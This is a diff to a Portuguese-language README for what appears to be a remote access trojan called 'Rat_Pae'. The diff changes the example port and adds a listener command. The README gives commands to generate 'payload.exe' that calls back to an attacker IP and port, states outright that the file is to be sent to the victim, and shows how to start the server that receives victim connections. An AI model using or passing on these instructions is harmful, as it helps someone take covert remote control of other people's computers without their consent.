@@ -7,7 +7,7 @@ Abra o PowerShell na pasta do projeto e execute:
 python server.py generate -a [IP_DO_SERVIDOR] -p [PORTA] -o [CAMINHO_DO_PAYLOAD]
 
 Exemplo:
-python server.py generate -a 192.168.15.200 -p 4444 -o C:\Users\Desktop\Desktop\Rat_Pae\payload.exe
+python server.py generate -a 192.168.15.200 -p 4000 -o C:\Users\Desktop\Desktop\Rat_Pae\payload.exe
 
 O arquivo "payload.exe" será criado no local indicado. Este é o arquivo que deve ser enviado para a vítima.
 
@@ -16,6 +16,10 @@ O arquivo "payload.exe" será criado no local indicado. Este é o arquivo que de
 ## 2. Iniciar o servidor para receber conexões
 
 python server.py bind -a [IP_DO_SERVIDOR] -p [PORTA]
+
+
+
+python server.py bind -a 192.168.15.200 -p 4000
 
 Exemplo:
 
